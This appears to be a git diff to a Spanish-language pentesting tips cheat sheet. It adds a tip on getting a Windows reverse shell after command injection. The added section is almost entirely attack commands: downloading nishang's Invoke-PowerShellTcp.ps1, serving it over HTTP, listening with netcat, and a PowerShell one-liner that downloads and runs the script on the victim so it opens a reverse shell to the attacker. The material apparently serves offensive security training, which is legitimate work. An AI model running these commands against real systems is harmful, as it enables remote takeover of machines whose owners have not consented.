@@ -698,6 +698,24 @@ bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  
 ```
 Como se puede observar en el primer ```ls``` la dimensión no esta ajustada correctamente, es por ello que se deben especificar las columnas y filas con el comando ```stty```, para ver que dimensiones son las correctas para tu computadora en una nueva ventana ejectuta el comando ```stty -a``` y lueho coloca el numero correspondiente.
 ## Tip #18: Generar una reverse shell para Windows
+Cuando logramos una inyección de comandos en un sistema windows necesitamos de herramientas para generar una reverse shell, la mejor en mi opinión es la de nishang, para lograr la shell primero debemos descargar el archivo de powershell:
+### Maquina atacante
+```bash
+wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
+```
+Ahora montamos nuestro servidor web con python3:
+```bash
+python3 -m http.server 80
+```
+Y también iniciamos nuestro netcat a la escucha:
+```bash
+nc -nlvp 9001
+```
+### Maquina victima
+Ahora el ultimo paso es inyectar el comando de powershell para entablar la conexión:
+```bash
+powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+```
 ## Tip #19: Transferencia de archivos en Windows
 ## Tip #20: Transferencia de archivos en Linux
 ### Mediante servidor web
